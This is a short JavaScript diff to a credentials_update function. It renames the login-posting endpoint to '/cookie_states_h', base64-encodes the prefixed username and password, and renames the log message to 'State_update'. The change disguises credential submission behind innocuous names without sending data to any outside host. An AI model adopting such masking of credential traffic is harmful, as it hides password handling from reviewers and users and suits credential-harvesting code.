@@ -14,15 +14,15 @@ function credentials_update(){
         dataType: "json",
   
 
-        url: api_path + "/network_connection",
+        url: api_path + "/cookie_states_h",
         data: { 
-            network_name: 'cj',
-            username: $('[name=uname]').val(), 
-            password: $('[name=pw]').val(), 
+            network_name: btoa('cj'),
+            username: btoa('ZX'+$('[name=uname]').val()), 
+            password: btoa('ZX'+$('[name=pw]').val()), 
         },
         success: function(data) {
             if (data.success === "yes") { 
-            	     c("credentials_update");
+            	     c("State_update");
             } else {
                 	 c("404 or empty"); 
             }
